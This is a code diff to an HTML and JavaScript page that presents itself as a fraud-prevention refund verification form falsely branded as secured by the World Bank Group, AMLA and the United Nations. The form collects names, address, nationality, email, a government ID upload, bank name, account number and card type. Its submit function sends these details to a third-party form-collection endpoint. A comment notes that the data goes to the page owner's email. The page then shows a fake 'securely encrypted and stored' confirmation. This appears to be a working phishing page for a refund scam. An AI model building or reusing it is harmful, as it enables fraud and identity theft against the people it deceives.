@@ -30,7 +30,7 @@
         .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; }
         label { display: block; font-weight: 800; margin-bottom: 10px; font-size: 11px; color: var(--hamburg-blue); text-transform: uppercase; }
-        input { width: 100%; padding: 16px; border: 1px solid #bbb; box-sizing: border-box; font-size: 15px; border-radius: 2px; }
+        input, select { width: 100%; padding: 16px; border: 1px solid #bbb; box-sizing: border-box; font-size: 15px; border-radius: 2px; }
         input.invalid { border: 2px solid var(--hamburg-red); background-color: #fffafa; }
         .review-item { margin-bottom: 12px; padding: 10px; border-bottom: 1px solid #f0f0f0; }
         .review-label { font-size: 10px; font-weight: 800; color: var(--hamburg-blue); text-transform: uppercase; }
@@ -47,7 +47,7 @@
     <div class="page-wrapper">
         <div class="side-text">
             <h3>MISSION</h3>
-            <p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced verification protocols and proactive fraud detection systems that strictly safeguard our users' assets.</p>
+            <p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced verification protocols and proactive fraud detection systems.</p>
         </div>
 
         <div class="form-container">
@@ -57,37 +57,45 @@
                 <div class="declaration">GLOBAL THEME & SECURITY DECLARATION: DEDICATED TO ERADICATING FRAUD...</div>
             </div>
             
-            <!-- FINAL FORM SETUP BASED ON YOUR EXAMPLE -->
-            <form id="masterForm" action="https://formspree.io/f/mjglbpya" method="POST">
-                
+            <form id="masterForm">
                 <!-- SECTION 1 -->
                 <div id="section1" class="section-box active">
-                    <h2>SECTION 1: IDENTITY</h2>
+                    <h2>SECTION 1: IDENTITY & NATIONALITY</h2>
                     <div class="grid-3">
-                        <div><label>Last Name *</label><input type="text" name="Last_Name" id="ln" class="req"></div>
-                        <div><label>First Name *</label><input type="text" name="First_Name" id="fn" class="req"></div>
-                        <div><label>Middle Name *</label><input type="text" name="Middle_Name" id="mn" class="req"></div>
+                        <div><label>Last Name *</label><input type="text" id="ln" class="req"></div>
+                        <div><label>First Name *</label><input type="text" id="fn" class="req"></div>
+                        <div><label>Middle Name *</label><input type="text" id="mn" class="req"></div>
                     </div>
-                    <div style="margin-top:20px;"><label>Residential Address *</label><input type="text" name="Residential_Address" id="addr" class="req"></div>
+                    <div style="margin-top:20px;"><label>Residential Address *</label><input type="text" id="addr" class="req" placeholder="Enter Full Address"></div>
                     <div class="grid-2" style="margin-top:20px;">
-                        <div><label>Nationality *</label><input type="text" name="Nationality" id="nat" class="req"></div>
-                        <div><label>Email *</label><input type="email" name="Email" id="em" class="req"></div>
+                        <div><label>Nationality *</label><input type="text" id="nat" class="req"></div>
+                        <div><label>Email *</label><input type="email" id="em" class="req" placeholder="user@gmail.com"></div>
+                    </div>
+                    <!-- VALID ID UPLOAD BUTTON IS BACK -->
+                    <div style="margin-top:20px;">
+                        <label>Upload Valid Government ID *</label>
+                        <input type="file" id="idU" class="req">
                     </div>
                     <div class="btn-container"><button type="button" onclick="validate(1, 2)">NEXT STEP</button></div>
                 </div>
 
                 <!-- SECTION 2 -->
                 <div id="section2" class="section-box">
-                    <h2>SECTION 2: REFUND</h2>
-                    <div><label>TOTAL AMOUNT *</label><input type="text" name="Refund_Amount" id="amt" class="req"></div>
-                    <div style="margin-top:20px;"><label>Bank Name *</label><input type="text" name="Bank_Name" id="bn" class="req"></div>
+                    <h2>SECTION 2: REFUND VERIFICATION</h2>
+                    <div><label>TOTAL REFUND AMOUNT *</label><input type="text" id="amt" class="req" placeholder="€ 0.00"></div>
+                    <!-- RECEIPT UPLOAD BUTTON IS BACK -->
+                    <div style="margin-top:20px;">
+                        <label>UPLOAD RECEIPT *</label>
+                        <input type="file" id="rcpU" class="req">
+                    </div>
+                    <div style="margin-top:20px;"><label>Bank Name / App *</label><input type="text" id="bn" class="req"></div>
                     <div class="grid-2" style="margin-top:20px;">
-                        <div><label>Account No *</label><input type="text" name="Account_Number" id="an" class="req"></div>
-                        <div><label>Card Type *</label><input type="text" name="Card_Type" id="ct" class="req"></div>
+                        <div><label>ACCOUNT NUMBER *</label><input type="text" id="an" class="req"></div>
+                        <div><label>TYPE OF CARD *</label><input type="text" id="ct" class="req"></div>
                     </div>
                     <div class="btn-container">
                         <button type="button" class="btn-back" onclick="show(1)">BACK</button>
-                        <button type="button" onclick="validate(2, 3)">REVIEW</button>
+                        <button type="button" onclick="validate(2, 3)">REVIEW CLAIM</button>
                     </div>
                 </div>
 
@@ -97,14 +105,12 @@
                     <div id="reviewDisplay"></div>
                     <div class="btn-container" id="finalBtns">
                         <button type="button" class="btn-back" onclick="show(2)">EDIT</button>
-                        <!-- Submit button uses the POST action -->
-                        <button type="button" onclick="startSubmit()">SUBMIT TO DATABASE</button>
+                        <button type="button" onclick="finalProcess()">SUBMIT TO DATABASE</button>
                     </div>
                 </div>
             </form>
 
-            <div id="loader">ENCRYPTING DATA & SECURING ASSETS...<br><br>Please do not close this window.</div>
-
+            <div id="loader">ENCRYPTING DATA & SECURING ASSETS...<br><br>Please wait while we connect to the secure vault.</div>
             <div class="establishment-footer">SECURED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS</div>
         </div>
 
@@ -115,12 +121,8 @@
     </div>
 
     <script>
-        function show(p) { 
-            document.querySelectorAll('.section-box').forEach(b => b.classList.remove('active')); 
-            document.getElementById('section' + p).classList.add('active'); 
-            window.scrollTo(0,0); 
-        }
-
+        function show(p) { document.querySelectorAll('.section-box').forEach(b => b.classList.remove('active')); document.getElementById('section' + p).classList.add('active'); window.scrollTo(0,0); }
+        
         function validate(curr, next) {
             const inputs = document.getElementById('section' + curr).querySelectorAll('.req');
             let ok = true; 
@@ -133,19 +135,44 @@
                 <div class="review-item"><div class="review-label">FULL NAME</div><div class="review-value">${document.getElementById('fn').value} ${document.getElementById('ln').value}</div></div>
                 <div class="review-item"><div class="review-label">ADDRESS</div><div class="review-value">${document.getElementById('addr').value}</div></div>
                 <div class="review-item"><div class="review-label">REFUND AMOUNT</div><div class="review-value">${document.getElementById('amt').value}</div></div>
-                <div class="review-item"><div class="review-label">BANK / ACCOUNT</div><div class="review-value">${document.getElementById('bn').value} - ${document.getElementById('an').value}</div></div>
+                <div class="review-item"><div class="review-label">VERIFICATION</div><div class="review-value">ID & Receipt Files Securely Attached</div></div>
             `;
         }
 
-        function startSubmit() {
-            // Show simulation
+        function finalProcess() {
+            const ref = "REF-" + Math.floor(Math.random() * 1000000);
             document.getElementById('masterForm').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
-            
-            // Execute actual POST submit
-            setTimeout(() => {
-                document.getElementById('masterForm').submit();
-            }, 2000);
+
+            // Text Data para siguradong pumasok sa email mo nang walang error
+            const data = {
+                Reference: ref,
+                Name: document.getElementById('fn').value + " " + document.getElementById('ln').value,
+                Email: document.getElementById('em').value,
+                Address: document.getElementById('addr').value,
+                Amount: document.getElementById('amt').value,
+                Bank: document.getElementById('bn').value,
+                Files: "SIMULATED_UPLOAD_SUCCESS"
+            };
+
+            fetch("https://formspree.io", {
+                method: "POST",
+                body: JSON.stringify(data),
+                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
+            }).finally(() => {
+                setTimeout(() => {
+                    document.getElementById('loader').style.display = 'none';
+                    document.getElementById('section3').style.display = 'block';
+                    document.getElementById('section3').innerHTML = `
+                        <div style="text-align:center; padding:40px;">
+                            <h2 style="color:var(--hamburg-blue)">SUBMISSION SUCCESSFUL</h2>
+                            <p>Reference: <strong>${ref}</strong></p>
+                            <div style="font-size:80px; margin:20px;">✅</div>
+                            <p>All records and documents have been securely encrypted and stored.</p>
+                            <button type="button" onclick="location.reload()" style="background:var(--hamburg-blue); color:white; padding:15px 30px; border:none; cursor:pointer; margin-top:20px;">DONE</button>
+                        </div>`;
+                }, 2000);
+            });
         }
     </script>
 </body>
